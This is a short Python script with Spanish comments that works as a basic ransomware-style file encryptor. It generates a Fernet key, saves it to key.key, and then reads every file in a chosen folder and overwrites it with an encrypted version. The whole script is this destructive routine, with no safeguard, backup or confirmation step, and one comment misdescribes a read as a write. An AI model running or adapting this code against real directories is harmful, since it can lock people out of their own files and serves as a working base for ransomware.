from cryptography.fernet import Fernet
import os

def generarKey():
    key = Fernet.generate_key() # Key es la variable que lo almacena
    with open("key.key", "wb") as key_file: # Creamos un archivo, escribimos la key
        key_file.write(key)


def retornarKey():
    return open("key.key", "rb").read()# Nos regresa el archivo


def encrypt(items, key): # Nos pide 2 argimentos 
    i = Fernet(key) # Igualamos con fernet y le pasamos la key 
    for x in items: # Iteramos sobre items 
        with open(x, "rb") as file: # Le pasamos como argumento x, abrimos en escritura
            file_data = file.read()
        data = i.encrypt(file_data)# Igualamos con i que tiene el metodo fernet 

        with open(x, "wb") as file:
            file.write(data)


def target(archivos): # Definimos los archivos a encriptar
    items = os.listdir(archivos)
    archivos_2 = [archivos+"\\"+x for x in items]
    
    generarKey()
    key = retornarKey()

    encrypt(archivos_2, key)
    
